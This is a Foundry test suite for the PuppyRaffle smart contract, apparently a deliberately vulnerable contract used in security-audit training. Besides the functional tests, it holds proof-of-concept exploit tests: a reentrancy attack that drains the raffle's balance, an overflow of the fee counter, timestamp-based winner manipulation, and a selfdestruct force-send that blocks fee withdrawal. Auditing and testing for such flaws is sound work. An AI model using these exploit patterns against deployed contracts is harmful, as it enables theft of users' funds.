// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle, AttackerContract, SelfDestruct} from "../src/PuppyRaffle.sol";

contract PuppyRaffleTest is Test {
    PuppyRaffle puppyRaffle;
    AttackerContract attackerContract;
    uint256 entranceFee = 1e18;
    address playerOne = address(1);
    address playerTwo = address(2);
    address playerThree = address(3);
    address playerFour = address(4);
    address feeAddress = address(99);
    address attacker = makeAddr("attacker");
    uint256 duration = 1 days;
    uint256 constant INITIAL_ATTACKER_BALANCE = 10 ether;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            duration
        );
        attackerContract = new AttackerContract(address(puppyRaffle));

        vm.deal(attacker, 10 ether);
    }

    //////////////////////
    /// EnterRaffle    ///
    /////////////////////

    function testCanEnterRaffle() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        assertEq(puppyRaffle.players(0), playerOne);
    }

    function testEnterRaffleBecomesMoreAndMoreExpensive() public {
        uint256 numberOfPlayers = 10;
        address[] memory players = new address[](numberOfPlayers);

        for (uint256 i = 0; i < numberOfPlayers; i++) {
            players[i] = address(uint160(i + 1));
        }

        uint256 gasStart = gasleft();

        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);

        // // 306.189 gas used for 10 players
        uint256 gasUsedInitial = gasStart - gasleft();

        address[] memory morePlayers = new address[](numberOfPlayers);

        for (uint256 i = 0; i < numberOfPlayers; i++) {
            morePlayers[i] = address(uint160(i + numberOfPlayers + 1));
        }

        uint256 gasAfter = gasleft();

        puppyRaffle.enterRaffle{ value: entranceFee * morePlayers.length }(morePlayers);

        // 395.088 gas used for 10 more players
        uint256 gasAfterUsed = gasAfter - gasleft();

        assert(gasAfterUsed > gasUsedInitial);
    }

    function testCantEnterWithoutPaying() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
        puppyRaffle.enterRaffle(players);
    }

    function testCanEnterRaffleMany() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
        assertEq(puppyRaffle.players(0), playerOne);
        assertEq(puppyRaffle.players(1), playerTwo);
    }

    function testCantEnterWithoutPayingMultiple() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
        puppyRaffle.enterRaffle{value: entranceFee}(players);
    }

    function testCantEnterWithDuplicatePlayers() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerOne;
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
    }

    function testCantEnterWithDuplicatePlayersMany() public {
        address[] memory players = new address[](3);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerOne;
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);
    }

    //////////////////////
    /// Refund         ///
    /////////////////////
    modifier playerEntered() {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        _;
    }

    function testCanGetRefund() public playerEntered {
        uint256 balanceBefore = address(playerOne).balance;
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);

        vm.prank(playerOne);
        puppyRaffle.refund(indexOfPlayer);

        assertEq(address(playerOne).balance, balanceBefore + entranceFee);
    }

    function testRefundReentrancy() public playersEntered {
        uint256 balanceOfRaffleBeforeAttack = address(puppyRaffle).balance;

        // console.log("Balance of raffle before refund: ", balanceOfRaffleBeforeAttack);
        vm.prank(address(attackerContract));
        vm.deal(address(attackerContract), INITIAL_ATTACKER_BALANCE);
        attackerContract.attack{ value: entranceFee }();
        
        uint256 balanceOfRaffleAfterAttack = address(puppyRaffle).balance;
        uint256 balanceOfAttackerAfterAttack = address(attackerContract).balance;

        // console.log("Balance of raffle after refund: ", balanceOfRaffleAfterAttack);
        // console.log("Balance of attacker: ", balanceOfAttackerAfterAttack);

        assertEq(balanceOfRaffleAfterAttack, 0);
        assertEq(balanceOfAttackerAfterAttack, INITIAL_ATTACKER_BALANCE + balanceOfRaffleBeforeAttack);
    }

    function testGettingRefundRemovesThemFromArray() public playerEntered {
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);

        vm.prank(playerOne);
        puppyRaffle.refund(indexOfPlayer);

        assertEq(puppyRaffle.players(0), address(0));
    }

    function testOnlyPlayerCanRefundThemself() public playerEntered {
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);
        vm.expectRevert("PuppyRaffle: Only the player can refund");
        vm.prank(playerTwo);
        puppyRaffle.refund(indexOfPlayer);
    }

    //////////////////////
    /// getActivePlayerIndex         ///
    /////////////////////
    function testGetActivePlayerIndexManyPlayers() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);

        assertEq(puppyRaffle.getActivePlayerIndex(playerOne), 0);
        assertEq(puppyRaffle.getActivePlayerIndex(playerTwo), 1);
    }


    //////////////////////
    /// selectWinner         ///
    /////////////////////
    modifier playersEntered() {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        _;
    }


    function testSelectWinnerOverflow() public playersEntered {
        // Warp to the end of the raffle
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        // Select the winner
        puppyRaffle.selectWinner();

        // 4 players initally, let's check the totalFees -> 800000000000000000 ~ 0.8 ether
        uint256 initiallyTotalFees = puppyRaffle.totalFees();

        console.log("Initially TotalFees: ", initiallyTotalFees);
        // Populate more players players so the totalFees overflows
        uint64 maxUint64 = type(uint64).max; // 18,446,744,073,709,551,615 ~ 18e18
        uint256 numPlayers = 89;
        address[] memory players = new address[](numPlayers);

        for (uint256 i = 0; i < numPlayers; i++) {
            players[i] = address(uint160(i + 1));
        }

        puppyRaffle.enterRaffle{value: players.length * entranceFee }(players);

        // Warp to the end of the raffle
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        // Select the winner
        puppyRaffle.selectWinner();

        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();

        // With 93 players, the totalFees overflows to this number 153255926290448384 which is the difference between actual totalFees and maxUint64, which is not proper
        uint256 endTotalFees = puppyRaffle.totalFees(); // 0.153.255.926.290.448.384

        console.log("TotalFees end: ", endTotalFees);
        // Shows off the overflow
        assert(endTotalFees < initiallyTotalFees);
    }


    function testRandomnessManipulation() public playersEntered {
        uint256 playersCount = puppyRaffle.getPlayersCount();
        uint256 expectedWinnerIndex =
            uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % playersCount;

        // Change the block timestamp to a known value
        vm.warp(block.timestamp + 10);
        uint256 manipulatedWinnerIndex =
            uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % playersCount;

        assert(expectedWinnerIndex != manipulatedWinnerIndex);
    }

    function testCantSelectWinnerBeforeRaffleEnds() public playersEntered {
        vm.expectRevert("PuppyRaffle: Raffle not over");
        puppyRaffle.selectWinner();
    }

    function testCantSelectWinnerWithFewerThanFourPlayers() public {
        address[] memory players = new address[](3);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = address(3);
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        vm.expectRevert("PuppyRaffle: Need at least 4 players");
        puppyRaffle.selectWinner();
    }

    function testSelectWinner() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.previousWinner(), playerFour);
    }

    function testSelectWinnerGetsPaid() public playersEntered {
        uint256 balanceBefore = address(playerFour).balance;

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 expectedPayout = ((entranceFee * 4) * 80 / 100);

        puppyRaffle.selectWinner();
        assertEq(address(playerFour).balance, balanceBefore + expectedPayout);
    }

    function testSelectWinnerGetsAPuppy() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.balanceOf(playerFour), 1);
    }

    function testPuppyUriIsRight() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        string memory expectedTokenUri =
            "data:application/json;base64,eyJuYW1lIjoiUHVwcHkgUmFmZmxlIiwgImRlc2NyaXB0aW9uIjoiQW4gYWRvcmFibGUgcHVwcHkhIiwgImF0dHJpYnV0ZXMiOiBbeyJ0cmFpdF90eXBlIjogInJhcml0eSIsICJ2YWx1ZSI6IGNvbW1vbn1dLCAiaW1hZ2UiOiJpcGZzOi8vUW1Tc1lSeDNMcERBYjFHWlFtN3paMUF1SFpqZmJQa0Q2SjdzOXI0MXh1MW1mOCJ9";

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.tokenURI(0), expectedTokenUri);
    }

    //////////////////////
    /// withdrawFees         ///
    /////////////////////
    function testCantWithdrawFeesIfPlayersActive() public playersEntered {
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }

    function testWithdrawFees() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 expectedPrizeAmount = ((entranceFee * 4) * 20) / 100;

        puppyRaffle.selectWinner();
        puppyRaffle.withdrawFees();
        assertEq(address(feeAddress).balance, expectedPrizeAmount);
    }

    function testWidthdrawFessMisshapen() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();

        SelfDestruct selfDestruct = new SelfDestruct(address(puppyRaffle));
        // Attack function destructs the `SelfDesctruct` contract and sends entrance fee to the puppyRaffle, which leads to a misshapen balance
        selfDestruct.attack{ value: entranceFee }();

        vm.prank(feeAddress);
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
}